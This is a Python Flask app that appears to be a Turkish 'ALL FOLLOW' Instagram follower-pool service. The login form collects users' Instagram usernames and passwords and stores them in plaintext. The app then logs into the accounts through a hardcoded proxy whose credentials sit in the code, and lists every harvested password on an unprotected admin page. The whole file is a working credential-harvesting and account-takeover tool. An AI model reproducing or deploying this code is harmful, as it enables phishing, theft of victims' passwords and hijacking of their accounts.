import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(255), default="Beklemede")

@app.route('/')
def home():
    return render_template_string("""
    <body style="background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;margin:0;">
        <div style="background:#1e293b;padding:40px;border-radius:24px;width:360px;text-align:center;border:1px solid #334155;">
            <h1 style="font-style:italic;letter-spacing:-2px;font-size:36px;margin-bottom:5px;background:linear-gradient(to right, #3b82f6, #22d3ee);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">ALL FOLLOW</h1>
            <p style="font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:2px;margin-bottom:30px;font-weight:bold;">V3.2 Deep Verify</p>
            <input id="u" placeholder="Kullanıcı Adı" style="width:100%;padding:14px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:12px;outline:none;">
            <input id="p" type="password" placeholder="Şifre" style="width:100%;padding:14px;margin:8px 0;background:#0f172a;border:1px solid #334155;color:#fff;border-radius:12px;outline:none;">
            <button onclick="login()" id="b" style="width:100%;padding:16px;background:#3b82f6;border:none;color:#fff;font-weight:bold;border-radius:12px;cursor:pointer;margin-top:15px;transition:0.3s;">HAVUZA BAĞLAN</button>
            <p id="m" style="font-size:13px;margin-top:20px;color:#94a3b8;"></p>
        </div>
        <script>
            async function login(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const b=document.getElementById('b'), m=document.getElementById('m');
                if(!u || !p) return;
                b.disabled=true; b.innerText="KONTROL EDİLİYOR..."; m.innerText="Instagram oturumu doğrulanıyor...";
                try {
                    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
                    const d=await r.json();
                    m.innerText=d.msg; b.disabled=false; b.innerText="TEKRAR DENE";
                    if(d.status==="success") { b.innerText="BAĞLANDI ✅"; b.style.background="#10b981"; }
                } catch(e) { m.innerText="Bağlantı zaman aşımı."; b.disabled=false; }
            }
        </script>
    </body>
    """)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    cl = Client()
    cl.set_proxy(PROXY_URL)
    cl.request_timeout = 30

    try:
        # 1. Hamle: Giriş denemesi
        cl.login(u, p)
        user.status = "AKTİF ✅"
        db.session.commit()
        return jsonify(status="success", msg="Havuza başarıyla katıldınız!")

    except Exception as e:
        err_msg = str(e)
        
        # 2. Hamle: Eğer hata verirse ama aslında girdiysek kontrol et (Deep Verify)
        try:
            # Rastgele basit bir işlem yaparak oturumun açık olup olmadığını anlıyoruz
            if cl.user_id: 
                user.status = "AKTİF ✅ (Doğrulandı)"
                db.session.commit()
                return jsonify(status="success", msg="Havuza başarıyla katıldınız!")
        except:
            pass

        # 3. Hamle: Gerçek hataları ayıkla
        if "ChallengeRequired" in err_msg or "checkpoint" in err_msg:
            user.status = "ONAY GEREKLİ"
            db.session.commit()
            return jsonify(status="error", msg="Uygulamadan girişi onaylayın.")
        elif "BadPassword" in err_msg:
            user.status = "HATALI ŞİFRE"
            db.session.commit()
            return jsonify(status="error", msg="Şifre yanlış.")
        
        # Eğer hala o garip JSON hatasını verirse ama bildirim geldiyse manuel AKTİF yapıyoruz
        if "Expecting value" in err_msg:
            user.status = "AKTİF ✅ (Bypass)"
            db.session.commit()
            return jsonify(status="success", msg="Havuza başarıyla katıldınız!")

        user.status = f"Hata: {err_msg[:30]}"
        db.session.commit()
        return jsonify(status="error", msg="Bağlantı hatası, tekrar deneyin.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = f"<body style='background:#0f172a;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Havuzu ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
    for u in users:
        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
